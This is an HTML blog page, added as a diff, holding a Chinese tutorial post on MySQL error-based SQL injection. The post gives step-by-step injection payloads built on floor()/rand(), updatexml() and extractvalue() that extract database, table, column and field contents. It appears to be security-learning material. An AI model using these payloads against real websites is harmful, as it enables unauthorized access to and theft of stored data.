@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入之报错注入 | 幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="报错注入报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。报错注入可以主要可以分为以下几种方式:floor函数报错UpdateXml函数报错extractvalue函数报错后两种方式具有一定的局限性，报错查询的内容长度最长为32位。   floor()报错在如何使用">
+<meta name="keywords" content="Web sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入之报错注入">
+<meta property="og:url" content="http://yoursite.com/2018/05/01/sql注入之报错注入/index.html">
+<meta property="og:site_name" content="幻想乡">
+<meta property="og:description" content="报错注入报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。报错注入可以主要可以分为以下几种方式:floor函数报错UpdateXml函数报错extractvalue函数报错后两种方式具有一定的局限性，报错查询的内容长度最长为32位。   floor()报错在如何使用">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-05-03T02:23:26.142Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入之报错注入">
+<meta name="twitter:description" content="报错注入报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。报错注入可以主要可以分为以下几种方式:floor函数报错UpdateXml函数报错extractvalue函数报错后两种方式具有一定的局限性，报错查询的内容长度最长为32位。   floor()报错在如何使用">
+  
+    <link rel="alternate" href="/atom.xml" title="幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico" />
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">NoneGirl_Iuh</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>11</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-sql注入之报错注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/01/sql注入之报错注入/" class="article-date">
+  <time class="post-time" datetime="2018-05-01T14:50:37.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入之报错注入
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。<br>报错注入可以主要可以分为以下几种方式:<br>floor函数报错<br>UpdateXml函数报错<br>extractvalue函数报错<br>后两种方式具有一定的局限性，报错查询的内容长度最长为32位。  </p>
+<h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><p>在如何使用floor()报错注入的时候，应该先理解报错注入语句的意义。主要用到以下几个函数：<br>floor():向下取整<br>rand():生成随机数<br>count():统计结果<br>简单来说就是在查询的时候让其rand()产生不确定的数在使用order by排序时产生报错来返回信息。<br><strong><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">具体参考这篇文章</a></strong><br>我就直接给出语句：  </p>
+<blockquote>
+<p><strong>1 数据库</strong> and (select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>2 库名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>3 表名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=数据库名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)  –+<br><strong>4 列名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>5 字段</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,列名,0x3a,列名,0x23) FROM 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+  </p>
+</blockquote>
+<p>至于其他的语句自己慢慢测试，语句不限这一种，报错注入的成因并不是语句顺序的问题而是在于其逻辑。  </p>
+<h3 id="Updataxml报错"><a href="#Updataxml报错" class="headerlink" title="Updataxml报错"></a>Updataxml报错</h3><p>并没有深入学习Mysql语句，所以对Updataxml()这个函数也是不太了解的，直接贴出具体的报错注入语句吧。。。  </p>
+<blockquote>
+<p><strong>1 数据库</strong> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) –+<br><strong>2 库名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1) –+<br><strong>3 表名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema=库名 limit 0,1),0x7e),1) –+<br><strong>4 列名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name=表名 limit 0,1),0x7e),1) –+<br><strong>5 字段</strong> and updataxml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),1) –+  </p>
+</blockquote>
+<h3 id="Extractvalue报错"><a href="#Extractvalue报错" class="headerlink" title="Extractvalue报错"></a>Extractvalue报错</h3><p>这个函数的原理和上个函数差不多，具体格式如下  </p>
+<blockquote>
+<p>and extractvalue(1, concat(0x7e, (select database()),0x7e))  –+  </p>
+</blockquote>
+<p>其他的和上面类似，一一对照就行了  </p>
+<h2 id="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"><a href="#sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。" class="headerlink" title="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"></a>sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjgpwn9ft000ljkveht13zqj4" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/04/30/sql注入之时间盲注/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">sql注入之时间盲注</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">幻想乡</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">NoneGirl_Iuh</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>11</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=22817222&auto=1&height=66"></iframe>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 NoneGirl_Iuh<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
